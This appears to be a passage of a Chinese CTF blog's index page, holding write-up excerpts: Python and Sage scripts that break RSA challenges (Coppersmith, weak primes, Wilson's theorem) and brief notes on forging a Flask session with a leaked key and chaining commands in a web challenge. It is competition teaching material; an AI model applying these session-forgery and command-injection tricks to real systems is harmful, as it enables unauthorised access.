+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/10/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(3)/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/06/05/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%E9%83%A8%E5%88%86crypto%E5%A4%8D%E7%8E%B0/">
+        <h2 class="post-title">第三届陕西省大学生网络安全技能大赛 部分crypto复现</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="奇怪的sar"><a href="#奇怪的sar" class="headerlink" title="奇怪的sar"></a>奇怪的sar</h1><p>lcg拿种子<br>爆破p的所有满足<code>p^q = seed</code>的可能然后求解<br>或者类似<code>第五空间signin</code>那题,不爆破所有可能(因为我爆破的脚本用的别人的,他用递归实现,1024位会超上限),只爆破低位<br><img src="https://img-blog.csdnimg.cn/ec3e4a87ca034b50af2fd58b28e8322c.png" alt="在这里插入图片描述"></p>
+<pre><code class="python">from Crypto.Util.number import *
+from tqdm import trange
+import gmpy2
+
+c = 14883053247652228283811442762780942186987432684268901119544211089991663825267989728286381980568977804079766160707988623895155236079459150322336701772385709429870215701045797411519212730389048862111088898917402253368572002593328131895422933030329446097639972123501482601377059155708292321789694103528266681104521268192526745361895856566384239849048923482217529011549596939269967690907738755747213669693953769070736092857407573675987242774763239531688324956444305397953424851627349331117467417542814921554060612622936755420459029769026126293588814831034143264949347763031994934813475762839410192390466491651507733968227
+e = 65537
+n =  24044063028844014127418595700558729326190738802687551098858513077613750188240082663594575453404975706225242363463089392757425008423696150244560748490108425645064339883915929498539109384801415313004805586193044292137299902797522618277016789979196782551492020031695781792205215671106103568559626617762521687128199445018651010056934305055040748892733145467040663073395258760159451903432330506383025685265502086582538667772105057401245864822281535425692919273252955571196166824113519446568745718898654447958192533288063735350717599092500158028352667339959012630051251024677881674246253876293205648190626145653304572328397
+
+seed = 39428646082513135314545544161912595458975375891528176714825766497155482031976852156313956476772023258684487799640179241987139554034654104867011313090105438798561154654679825702410748780286094326639330840289843154525176685892323447168072417654823748596238888125898914210332775882916911771786984574407163323116
+
+def findp(p,plist):
+    l=len(p)
+    if l==600:
+        plist.append(int(p,2))
+    else:
+        pp=int(p,2)
+        qq=(seed^^pp)%2**l
+        if pp*qq%2**l==n%2**l:
+            findp(&#39;1&#39;+p,plist)
+            findp(&#39;0&#39;+p,plist)
+
+plist=[]
+findp(&#39;1&#39;,plist)
+print(plist)
+
+
+
+for i in trange(len(plist)):
+    PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+    f = x*2^600 + plist[i]
+    f = f.monic()
+    r = f.small_roots(X=2^424, beta=0.4)
+    if r:
+        p = int(plist[i]+r[0]* 2^600)
+        if n%p == 0:
+            break
+
+q = n // p
+d = gmpy2.invert(e, (p-1)*(q-1))
+print(long_to_bytes(power_mod(c, d, n)))
+</code></pre>
+<h1 id="M3"><a href="#M3" class="headerlink" title="M3"></a>M3</h1><pre><code class="c">from Crypto.Util.number import *
+from rsaAttack import rsaATTACK
+from itertools import product
+from string import digits
+import gmpy2
+
+c = 35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041
+n = 142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633
+e = 65537
+
+pqh = str(n)[:19]
+pql = str(n)[-18:]
+
+# for i,j in product(digits,repeat=2):
+#     pq = pqh + i + j + pql
+#     tp = rsaATTACK.factor_n(int(pq))
+#     if tp and len(tp) == 2 and tp[0].bit_length() == 64:
+#         p, q = tp
+#         break
+# print(p,q)
+p = 9937378783676979077 
+q = 14357114660923972229
+P = int(str(p) + str(q)) #128 
+Q = int(str(q) + str(p)) #128 
+PP = int(str(P) + str(Q)) #256 
+QQ = int(str(Q) + str(P)) #256 
+
+d = gmpy2.invert(e,(PP-1)*(QQ-1))
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/05/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%E9%83%A8%E5%88%86crypto%E5%A4%8D%E7%8E%B0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/06/04/Round#13%20web%E4%B8%93%E9%A1%B9%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">Round#13 web专项部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a1bf23691f18f7422842fa37da057a66.png" alt="image-20230604100247293"></p>
+<p>忘记密码处有secretkey</p>
+<p>然后就是伪造session了,这里猜一下要什么</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9d75ff2defcc7288b2435d3c35a3c247.png" alt="image-20230604105953099"></p>
+<p>最后应该是<code>_is_admin</code>有用,我没细看,当时平台卡麻了<br>指正:改<code>_user_id</code>为1</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7c978dece0a1ae750913a40c64544289.png" alt="image-20230604105945576"></p>
+<h1 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h1><p>注意到可以拼接命令,但是执行的回显只有数字</p>
+<p>那么可以考虑读取后用od命令来转8进制读取</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/04b75cc59a770e17da91dc934a871934.png" alt="image-20230604121450662"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2328d1a710b5739041db12c5b6ba7f1b.png" alt="image-20230604121516085"></p>
+<h2 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>这里当时拿到key了,但是被第一题的思路误导了,第一题不用猜伪造什么,因为我一开始<code>user_id</code>改的0,没成功然后乱试什么isadmin之类的<br><code>useri_id</code>改1就行,我早知道改改id试试了<br>这里在登录后看源码有个wor路由<br>去wor路由然后随便弄个非法的<code>session</code>就可以看到key 把报错那个展开<br><img src="https://img-blog.csdnimg.cn/e8644c8d2fdc43168ef26560f5a74e8b.png" alt="在这里插入图片描述"><br><code>hardgam3_C0u1d_u_f1ndM3????</code></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好久没做web了,就出了两个最简单的,现在一看太菜了还是,信息收集那题我不知道只有一个文件读能干什么</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/04/Round#13%20web%E4%B8%93%E9%A1%B9%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/06/02/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(2)/">
+        <h2 class="post-title">NSS周常刷密码(2)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="GWCTF-2019-babyRSA"><a href="#GWCTF-2019-babyRSA" class="headerlink" title="[GWCTF 2019]babyRSA"></a>[GWCTF 2019]babyRSA</h1><p>解答过程在脚本内</p>
+<pre><code class="python-">from Crypto.Util.number import *
+import gmpy2
+import sympy
+import z3
+
+e = 0x10001
+N=636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163
+m1=90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239
+m2=487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546
+
+# p q接近 可分解N得到pq
+p=797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699
+q=797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737
+# 且可以通过prevprime得到 secret_num
+# print(sympy.prevprime(p))
+secret_num = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377746907
+
+# 有了pq可以先拿到c1 和 c2
+d = gmpy2.invert(e,(p-1)*(q-1))
+c1 = int(pow(m1,d,N))
+c2 = int(pow(m2,d,N))
+# 然后我们知道c1 c2的两个等价关系
+# 用z3来解
+
+
+
+F1,F2 = z3.Ints(&quot;F1 F2&quot;)
+s = z3.Solver()
+s.add(F1+F2 == c1)
+s.add(F1**3 + F2**3 == c2)
+s.check()
+print(s.model())
+# [F2 = 1141553212031156130619789508463772513350070909,
+#  F1 = 1590956290598033029862556611630426044507841845]
+
+F2 = 1141553212031156130619789508463772513350070909
+F1 = 1590956290598033029862556611630426044507841845
+print(long_to_bytes(F1)+long_to_bytes(F2))
+</code></pre>
+<h1 id="CISCN-2021初赛-rsa"><a href="#CISCN-2021初赛-rsa" class="headerlink" title="[CISCN 2021初赛]rsa"></a>[CISCN 2021初赛]rsa</h1><p>小e<br>共模<br>p高位泄露<br>解得</p>
+<pre><code class="c">O wild West Wind, thou breath of Autumn&#39;s being,
+Thou, from whose unseen presence the leaves dead
+Are driven, like ghosts from an enchanter fleeing,
+Yellow, and black, and pale, and hectic red,
+Pestilence-stricken multitudes: O thou,
+Who chariotest to their dark wintry bed
+</code></pre>
+<p>然后发现这么搞有问题,我是没对上格式md5能对<br>所以用如下脚本</p>
+<pre><code class="python">from Crypto.Util.number import *
+import hashlib
+
+m1 = 267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157
+m2 = 4193305853284549103821195807609492624095031428085219879448342104337322945001387680236011960472296815293233144303730273979905837762067652913308898433728800864776794638198055607422503065410595894676740531680367227696622352026247676452540064020322619036125381146346603655445487695574824919137
+m3 = 978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882
+print(hashlib.md5(long_to_bytes(m1)+long_to_bytes(m2)+long_to_bytes(m3)).hexdigest())
+</code></pre>
+<h1 id="LitCTF-2023-你是我的关键词-Keyworld-初级"><a href="#LitCTF-2023-你是我的关键词-Keyworld-初级" class="headerlink" title="[LitCTF 2023]你是我的关键词(Keyworld) (初级)"></a>[LitCTF 2023]你是我的关键词(Keyworld) (初级)</h1><p>关键词加解密<br>key是YOU</p>
+<h1 id="RoarCTF-2019-babyRSA"><a href="#RoarCTF-2019-babyRSA" class="headerlink" title="[RoarCTF 2019]babyRSA"></a>[RoarCTF 2019]babyRSA</h1><p>这题考威尔逊定理</p>
+<pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+import sympy
+
+def get_prime(A,B):
+    tem = 1
+    for i in range(B+1,A):
+        tem = (tem * i) % A
+    k = (-1*gmpy2.invert(tem,A))%A
+    return sympy.nextprime(k)
+
+n = 85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
+e = 0x1001
+c = 75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428
+
+A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
+B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
+A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
+B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
+p = get_prime(A1,B1)
+q = get_prime(A2,B2)
+r = n // p // q
+d = gmpy2.invert(e,(p-1)*(q-1)*(r-1))
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<h1 id="LitCTF-2023-Is-this-only-base"><a href="#LitCTF-2023-Is-this-only-base" class="headerlink" title="[LitCTF 2023]Is this only base?"></a>[LitCTF 2023]Is this only base?</h1><p><img src="https://img-blog.csdnimg.cn/f5c687cc725c4b5b925c6633b7c59952.png" alt="在这里插入图片描述"></p>
+<h1 id="RoarCTF-2019-RSA"><a href="#RoarCTF-2019-RSA" class="headerlink" title="[RoarCTF 2019]RSA"></a>[RoarCTF 2019]RSA</h1><p>n能分解</p>
+<pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+A =  2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724
+n =  117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
+c =  41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128
+# A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x
+# p=next_prime(z*x*y)
+# q=next_prime(z)
+
+p=139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183
+q=842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569
+for e in range(1,1000000):
+    try:
+        d = gmpy2.invert(e,(p-1)*(q-1))
+        flag = long_to_bytes(pow(c,d,n))
+        if b&#39;CTF&#123;&#39; in flag:
+            print(flag)
+            break 
+    except:
+        continue
+    
+</code></pre>
+<p>另一种做法是解x和y</p>
+<pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+import sympy
+
+A =  2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724
+n =  117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
+c =  41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128
+# A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x
+# p=next_prime(z*x*y)
+# q=next_prime(z)
+def get_x_y():
+    for x in range(2,1000):
+        for y in range(2,1000):
+            try:
+                res = (((y%x)**5)%(x%y))**2019+y**316+(y+1)//x
+                if A == res:
+                    return x,y
+            except:
+                pass
+
+
+def get_p(x,y):
+    tem = n // (x*y)
+    p = gmpy2.iroot(tem,2)[0]
+    while True:
+        p = sympy.nextprime(p)
+        if n % p == 0 :
+            return p
+
+x, y = get_x_y()
+p = get_p(x,y)
+q = n // p
+for e in range(1,1000000):
+    try:
+        d = gmpy2.invert(e,(p-1)*(q-1))
+        flag = long_to_bytes(pow(c,d,n))
+        if b&#39;CTF&#123;&#39; in flag:
+            print(flag)
+            break 
+    except:
+        continue
+    
+</code></pre>
+<h1 id="AFCTF-2018-Single"><a href="#AFCTF-2018-Single" class="headerlink" title="[AFCTF 2018]Single"></a>[AFCTF 2018]Single</h1><p><code>https://quipqiup.com/</code>一把梭</p>
+<h1 id="NSSCTF-2022-Spring-Recruit-factor"><a href="#NSSCTF-2022-Spring-Recruit-factor" class="headerlink" title="[NSSCTF 2022 Spring Recruit]factor"></a>[NSSCTF 2022 Spring Recruit]factor</h1><pre><code class="python">import hashlib
+
+p=13891650093628440437
+q=17315890900809982861
+
+print(hashlib.md5(str(p+q).encode()).hexdigest())
+    
+</code></pre>
+<h1 id="鹤城杯-2021-BabyRSA"><a href="#鹤城杯-2021-BabyRSA" class="headerlink" title="[鹤城杯 2021]BabyRSA"></a>[鹤城杯 2021]BabyRSA</h1><p>已知p高位q低位<br>由<br>$$\begin{array}{l}<br>N \equiv p_{l} * q_{l} \bmod 2^{265} \<br>P_{l} \equiv N * q_{l}^{-1} \bmod 2^{265}<br>\end{array}$$<br>可以得到$$p_{l}$$</p>
+<p>coppersmith打p</p>
+<p>脚本如下</p>
+<pre><code class="python">#sage
+from Crypto.Util.number import *
+import gmpy2
+
+c = 19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188
+ph = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479
+ql = 40812438243894343296354573724131194431453023461572200856406939246297219541329623
+n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969
+e = 65537
+
+pl = n * gmpy2.invert(ql,2**265) % 2**265
+pbits = 1024
+
+
+PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+ph = ph &lt;&lt; 724
+for i in range(2**6):
+    f = ph + 2^265 * x * 2**6 + pl + i*2^265
+    f = f.monic()
+    p = f.small_roots(X=2^(459-6),beta=0.4)
+    if p:
+        p = ph + 2^265 * int(p[0]) * 2**6 + pl + i*2^265
+        print(p)
+        break
+q = n // p
+d = gmpy2.invert(e,(p-1)*(q-1))
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<p>这里直接打不行,就爆破几位</p>
+<h1 id="LitCTF-2023-原来你也玩原神-初级"><a href="#LitCTF-2023-原来你也玩原神-初级" class="headerlink" title="[LitCTF 2023]原来你也玩原神 (初级)"></a>[LitCTF 2023]原来你也玩原神 (初级)</h1><p>网上找个原的图一个个对<br><code>LITCTF&#123;YUANLAINIYEWANYUANSHENWWW&#125;</code></p>
+<h1 id="LitCTF-2023-家人们！谁懂啊，RSA签到都不会-初级"><a href="#LitCTF-2023-家人们！谁懂啊，RSA签到都不会-初级" class="headerlink" title="[LitCTF 2023]家人们！谁懂啊，RSA签到都不会 (初级)"></a>[LitCTF 2023]家人们！谁懂啊，RSA签到都不会 (初级)</h1><p><img src="https://img-blog.csdnimg.cn/01f547b4ff8c4104aa7c6babe5b8d67e.png" alt="在这里插入图片描述"></p>
+<h1 id="HDCTF-2023-Normal-Rsa"><a href="#HDCTF-2023-Normal-Rsa" class="headerlink" title="[HDCTF 2023]Normal_Rsa"></a>[HDCTF 2023]Normal_Rsa</h1><p>直接给了明文密码</p>
+<h1 id="HGAME-2022-week2-RSA-Attack2"><a href="#HGAME-2022-week2-RSA-Attack2" class="headerlink" title="[HGAME 2022 week2]RSA Attack2"></a>[HGAME 2022 week2]RSA Attack2</h1><p>共享素数<br>小e<br>共模<br><code>hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;</code></p>
+<h1 id="NCTF-2019-childRSA"><a href="#NCTF-2019-childRSA" class="headerlink" title="[NCTF 2019]childRSA"></a>[NCTF 2019]childRSA</h1><p><img src="https://img-blog.csdnimg.cn/0d1c0238210f4e83b7369d11f07db89e.png" alt="在这里插入图片描述"><br>p-1光滑<br><code>python -m primefac -vs -m=p-1</code>慢慢跑<br>一分钟左右能出</p>
+<h1 id="HUBUCTF-2022-新生赛-RSAaaa"><a href="#HUBUCTF-2022-新生赛-RSAaaa" class="headerlink" title="[HUBUCTF 2022 新生赛]RSAaaa"></a>[HUBUCTF 2022 新生赛]RSAaaa</h1><pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+
+s = &quot;473878130775 40132555282 40132555282 94619939727 72818765591 208015808884 42561234694 159353248388 27748063975 159353248388 159353248388 278953790403 410746718603 496849210942 27748063975 142521857906 103632267191 17774494147 328684046745 278953790403 129956887006 129956887006 366275425558 328684046745 142521857906 410746718603 142521857906 129956887006 379067009467 328684046745 159353248388 366275425558 129956887006 103632267191 27748063975 27748063975 17774494147 160623996897 278953790403 182341799525&quot;
+n = 536970330703
+p=540961
+q=992623
+e = 65537
+d = gmpy2.invert(e,(p-1)*(q-1))
+for i in s.split(&quot; &quot;):
+    print(long_to_bytes(pow(int(i),d,n)).decode(),end=&#39;&#39;)
+</code></pre>
+<h1 id="CISCN-2022-西南-rsa"><a href="#CISCN-2022-西南-rsa" class="headerlink" title="[CISCN 2022 西南]rsa"></a>[CISCN 2022 西南]rsa</h1><p>题给了一堆没用的条件<br>关键在<code>lcm = gmpy2.lcm(P-1, Q-1)</code><br>lcm(P-1,Q-1) &#x2F;&#x2F; gcd(P-1,Q-1) &#x3D; (P-1)(Q-1)<br>而rsa生成的 (P-1)(Q-1)大概率互素<br>尝试用1先试试,就解出来了</p>
+<pre><code class="python">from  Crypto.Util.number import *
+import gmpy2
+
+
+E = 65537
+c = 4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206
+N  = 17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669
+phi = 4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624
+
+d = gmpy2.invert(E,phi)
+print(long_to_bytes(pow(c,d,N)))
+</code></pre>
+<h1 id="SWPUCTF-2021-新生赛-crypto3"><a href="#SWPUCTF-2021-新生赛-crypto3" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto3"></a>[SWPUCTF 2021 新生赛]crypto3</h1><p>数学推导过程参考<br><code>https://blog.csdn.net/qq_51999772/article/details/120926547</code></p>
+<pre><code class="python">#sage
+from Crypto.Util.number import *
+
+c1= 17893542812755845772427795161304049467610774531005620109503081344099161906017295486868699578946474114607624347167976713200068059018517606363517478396368430072890681401898145302336139240273132723451063402106360810413024642916851746118524166947301681245568333254648265529408446609050354235727237078987509705857
+c2= 95580409405085606847879727622943874726633827220524165744517624606566789614499137069562997931972825651309707390763700301965277040876322904891716953565845966918293178547100704981251056401939781365264616997055296773593435626490578886752446381493929807909671245959154990639046333135728431707979143972145708806954
+n= 140457323583824160338989317689698102738341061967768153879646505422358544720607476140977064053629005764551339082120337223672330979298373653766782620973454095507484118565884885623328751648660379894592063436924903894986994746394508539721459355200184089470977772075720319482839923856979166319700474349042326898971
+
+PR.&lt;m&gt; = PolynomialRing(Zmod(n))
+f = m**2 - m*(c1+c2) + c1*c2
+m = f.small_roots()
+print(long_to_bytes(int(m[0])))
+</code></pre>
+<h1 id="HGAME-2022-week3-Multi-Prime-RSA"><a href="#HGAME-2022-week3-Multi-Prime-RSA" class="headerlink" title="[HGAME 2022 week3]Multi Prime RSA"></a>[HGAME 2022 week3]Multi Prime RSA</h1><pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+
+# n = p ** 2 * q ** 3 * r ** 5 * s ** 7
+
+p = 61789932148719477384027458333380568978056286136137829092952317307711908353477
+q = 91207969353355763685633284378833506319794714507027332929290701748727534193861
+r = 105471299607375388622347272479207944509670502835651250945203397530010861809367
+s = 83153238748903772448138307505579799277162652151244477391465130504267171881437
